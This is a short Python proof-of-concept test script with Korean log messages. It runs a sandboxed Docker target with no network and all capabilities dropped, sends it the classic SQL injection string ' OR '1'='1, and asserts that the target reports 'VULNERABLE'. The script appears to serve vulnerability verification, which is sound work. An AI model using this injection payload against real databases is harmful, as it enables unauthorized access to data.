import subprocess

proc = subprocess.Popen(
    [
        'docker', 'run', '--rm', '-i',
        '--network', 'none',
        '--memory', '128m',
        '--cpus', '0.5',
        '--cap-drop', 'ALL',
        '--security-opt', 'no-new-privileges',
        'vsh-poc-target'
    ],    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

first = proc.stdout.readline().decode().strip()
print(f'[1] 기동 신호: {first}')
assert first == 'READY', f'READY 아님: {first}'

payload = "' OR '1'='1\n"
proc.stdin.write(payload.encode())
proc.stdin.flush()

result = proc.stdout.readline().decode().strip()
print(f'[2] SQLi 페이로드 결과: {result}')
assert result == 'VULNERABLE', f'예상과 다름: {result}'

proc.wait()
print('[3] VULNERABLE 검증 성공')